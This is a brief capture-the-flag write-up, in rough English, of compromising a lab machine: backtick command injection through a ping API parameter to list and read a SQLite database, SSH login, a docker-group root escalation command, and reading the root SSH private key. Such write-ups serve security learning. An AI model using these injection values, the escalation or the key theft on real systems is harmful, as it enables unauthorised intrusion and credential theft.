after we brute for the and checks any vurnarabality in the in api.js we have a clue call. 
`10.10.113.176:8081/ping?ip=10.10.113.176`
it ping s the command

after that it command window right. lets check any files are databases in it
http://10.10.113.176:8081/ping?ip=`ls`
we got this `utech.db.sqlite`

in this database we got a hash text.
http://10.10.113.176:8081/ping?ip=`cat%20utech.db.sqlite`

we are login via ssh : `ssh r00t@10.10.41.251`

we are entered the shell lets check the root privilage for this.
```
sudo -l
```
we didn't get anything. for that lets check the id of the system`id` command to check the root or other service are working are not.

we are seen the `docker`, for this lets check the privilage escation for docker in this website [gtfobins](https://gtfobins.github.io/gtfobins/docker/#sudo).

we got this command 

`sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.

now we are in docker, then check the operation is running.

`docker ps`

we got chroot, for this get into the chroot usin this command. `docker run -v /:/mnt --rm -it bash chroot /mnt sh`

we are enter the privilage mode. now we have to modify this mode.

lets check the id_rsa 9 digit value in
```
cat /root/.ssh/id_rsa
```
we got :`MIIEogIBA`
